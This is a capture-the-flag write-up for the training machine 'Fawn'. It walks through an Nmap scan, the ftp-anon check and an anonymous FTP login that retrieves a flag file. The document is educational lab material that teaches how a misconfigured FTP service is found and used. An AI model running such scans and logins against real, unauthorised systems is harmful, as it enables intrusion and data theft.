---
name: Fawn
OS: linux
difficulty: very easy
date: May 1st 2023
tags: FTP
---

## Description
This is the second machine in the Tier 0 of Starting Point. It covers a simple example of an FTP server being used on a target system.

## Enumeration
Let's start with a simple Nmap scan on the target.
```
$ nmap -F -sV --reason $ip

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
Service Info: OS: Unix
```
There is a single open port on this machine which `vsftpd 3.0.3`, an FTP service. The `ftp-anon` Nmap script can be used to determine if anonymous login is turned available.
```
$ nmap -p21 --script ftp-anon $ip

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```
The scan result clearly states that anonymous login is indeed turned on. What's more, the listing of the FTP directory reveals the `flag.txt` file.

An FTP client can be used to login to the FTP server as `anonymous` user and retrieve the flag.

```
$ ftp $ip
Connected to 10.129.173.59.
220 (vsFTPd 3.0.3)
Name (10.129.173.59:b4rt00): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.

ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (336.0215 kB/s)

ftp> bye
221 Goodbye.

$ cat flag.txt
[REDACTED]
```

## Summary
This box presents how a misconfigured FTP service with anonymous login turned on can expose files stored on the server to basically anyone who knows that there is an FTP server there.

## Resources
[FTP wikipedia article](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
